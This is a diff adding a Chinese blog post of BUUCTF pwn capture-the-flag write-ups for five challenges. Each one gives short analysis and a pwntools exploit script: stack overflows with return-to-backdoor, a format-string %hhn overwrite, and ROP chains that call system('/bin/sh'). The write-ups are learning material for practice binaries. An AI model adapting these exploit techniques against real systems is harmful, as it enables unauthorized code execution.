@@ -149,6 +149,154 @@
     
     
     <article
+  id="post-BUUCTF-PWN题解（2）"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2023/08/12/BUUCTF-PWN%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/"
+    >BUUCTF-PWN题解（2）</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/08/12/BUUCTF-PWN%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/" class="article-date">
+  <time datetime="2023-08-12T08:35:31.000Z" itemprop="datePublished">2023-08-12</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><ul>
+<li>文件检查：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121655112.png" alt="image-20230812165331546"></p>
+<ul>
+<li>代码分析：</li>
+</ul>
+<p>发现敏感函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121704494.png" alt="image-20230812165940683"></p>
+<p>主函数直接调用vuln函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121700633.png" alt="image-20230812170039103"></p>
+<p>vuln函数中第十12行的fgets是输入点，但只读入32个字节的数据，但s可以接收0x3c个字节的数据。好在后面的程序会将一个字节的“i”变换为三个字节的“you”，这时就可以进行溢出。</p>
+<p>exp：</p>
+<p><code>from pwn import * #io=process(&quot;Desktop/pwn1&quot;) io=remote(&#39;node4.buuoj.cn&#39;,27014) flag=0x8048F0D payload=b&#39;I&#39;*20+b&#39;a&#39;*4+p32(flag) io.sendline(payload) io.interactive()</code></p>
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121722017.png" alt="image-20230812172245340"></p>
+<hr>
+<h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><ul>
+<li>文件检查：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121725563.png" alt="image-20230812172553051"></p>
+<ul>
+<li>代码分析：</li>
+</ul>
+<p>主函数直接输出一段<code>Hello，World</code>,然后返回到受害者函数，受害者函数中存在溢出，且给出了后门函数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121806206.png" alt="image-20230812180636697"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121807840.png" alt="image-20230812180701741"></p>
+<p>记录地址，写出exp:</p>
+<p><code>from pwn import *</code><br><code>io=process(&#39;./level0&#39;)</code><br><code>#io=remote(&#39;node4.buuoj.cn&#39;,29931)</code><br><code>add=0x400596</code><br><code>payload=b&#39;a&#39;*0x88+p64(add)</code></p>
+<p><code>io.sendline(payload)</code><br><code>io.interactive()</code></p>
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121810008.png" alt="image-20230812181006060"></p>
+<hr>
+<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><ul>
+<li>文件检查：设置了canary</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121837318.png" alt="image-20230812183748286"></p>
+<ul>
+<li>代码分析：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121935382.png" alt="image-20230812193545462"></p>
+<p>源程序大意是把<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%9A%8F%E6%9C%BA%E6%95%B0&spm=1001.2101.3001.7020">随机数</a>放入到bss段的0x804c044处，用户输入用户名和密码，如果密码和随机数相等，则拿到权限。</p>
+<ul>
+<li>解题思路：</li>
+</ul>
+<p><strong>（1）确定格式化字符串漏洞输出参数的位置</strong></p>
+<p><strong>（2）通过%n修改0x804C044位置处的值</strong></p>
+<p>**（3）输入与0x804C004位置处相同的值达到执行 system(“&#x2F;bin&#x2F;sh”)的目的 **</p>
+<p>exp如下：</p>
+<p><code>from pwn import *</code><br><code>io=remote(&#39;node4.buuoj.cn&#39;,28006)</code></p>
+<p><code>io=process(&#39;./pwn&#39;)</code></p>
+<p><code>context.log_level = &#39;debug&#39;</code><br><code>add = 0x804C044</code></p>
+<p><code>payload = p32(add) + p32(add+1) + p32(add+2) + p32(add+3)</code><br><code>payload += b&#39;%10$hhn%11$hhn%12$hhn%13$hhn&#39;</code><br><code>io.sendline(payload)</code></p>
+<p><code>io.sendline(str(0x10101010))</code><br><code>io.interactive()</code></p>
+<p>得到flag：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121949879.png" alt="image-20230812194936958"></p>
+<hr>
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><ul>
+<li>文件检查：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308121954273.png" alt="image-20230812195453638"></p>
+<ul>
+<li>代码分析：</li>
+</ul>
+<p>主函数调用受害者函数，其中有system函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308122111589.png" alt="image-20230812211147073"></p>
+<p>找到bin&#x2F;sh</p>
+<p><img src="/2023/08/12/BUUCTF-PWN%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/image-20230812211216788.png" alt="image-20230812211216788"></p>
+<ul>
+<li>解题思路：</li>
+</ul>
+<p>（1）制造栈溢出</p>
+<p>（2）构造ROP链：system_add+‘aaaa’+bin&#x2F;sh_add</p>
+<ul>
+<li>exp如下：</li>
+</ul>
+<p><code>from pwn import *</code><br><code>#io=remote(&#39;node4.buuoj.cn&#39;,25734)</code><br><code>io=process(&#39;./level2&#39;)</code><br><code>elf=ELF(&#39;./level2&#39;)</code><br><code>bin_add=0x0804A024</code><br><code>sys_add=elf.plt[&#39;system&#39;]</code></p>
+<p><code>payload=b&#39;a&#39;*0x8c+p32(sys_add)+b&#39;a&#39;*4+p32(bin_add)</code><br><code>io.sendline(payload)</code><br><code>io.interactive()</code></p>
+<ul>
+<li>得到flag</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308122114594.png" alt="image-20230812211433544"></p>
+<hr>
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><ul>
+<li>文件检查</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308122120684.png" alt="image-20230812212021730"></p>
+<ul>
+<li>代码分析：</li>
+</ul>
+<p>与32位基本一样，解题思路也类似，但需要将参数放置到rdi中，用到pop rdi指令片段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308122134353.png" alt="image-20230812213405579"></p>
+<ul>
+<li>exp如下：</li>
+</ul>
+<p><code>from pwn import *</code><br><code>#io=process(&#39;./x64&#39;)</code><br><code>io=remote(&#39;node4.buuoj.cn&#39;,27545)</code><br><code>elf=ELF(&#39;./x64&#39;)</code></p>
+<p><code>sys=elf.plt[&#39;system&#39;]</code><br><code>bin=0x0000000000600A90</code><br><code>pop=0x00000000004006b3</code><br><code>payload=b&#39;a&#39;*0x88+p64(pop)+p64(bin)+p64(sys)</code><br><code>io.sendline(payload)</code><br><code>io.interactive()</code></p>
+<ul>
+<li>得到flag：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202308122139723.png" alt="image-20230812213908385"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
   id="post-BUUCTF-PWN解题（1）"
   class="article article-type-post"
   itemscope
